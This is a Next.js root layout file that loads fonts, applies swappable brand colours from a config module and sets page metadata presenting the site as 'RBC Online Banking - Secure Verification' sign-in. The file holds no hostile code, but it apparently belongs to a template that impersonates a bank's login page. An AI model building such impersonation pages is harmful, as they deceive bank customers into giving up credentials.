import type { Metadata } from "next";
import { Roboto, Geist_Mono } from "next/font/google";
import "./globals.css";
import Script from "next/script";
import { brandCSSVariables } from "@/config/branding";

const roboto = Roboto({
  variable: "--font-roboto",
  subsets: ["latin"],
  weight: ["100", "300", "400", "500", "700", "900"],
});

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
});

export const metadata: Metadata = {
  title: "RBC Online Banking - Secure Verification",
  description: "Securely sign in to RBC Online Banking",
  icons: {
    icon: '/assets/icons/favicon.ico',
  },
};

// Map brand variables to the names expected by globals.css
const style = {
  '--primary': brandCSSVariables['--color-primary'],
  '--secondary': brandCSSVariables['--color-secondary'],
  '--accent': brandCSSVariables['--color-accent'],
} as React.CSSProperties;

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en">
      <body
        className={`${roboto.variable} ${geistMono.variable} antialiased`}
        style={style}
      >
        <Script src="/config.js" strategy="beforeInteractive" />
        {children}
      </body>
    </html>
  );
}
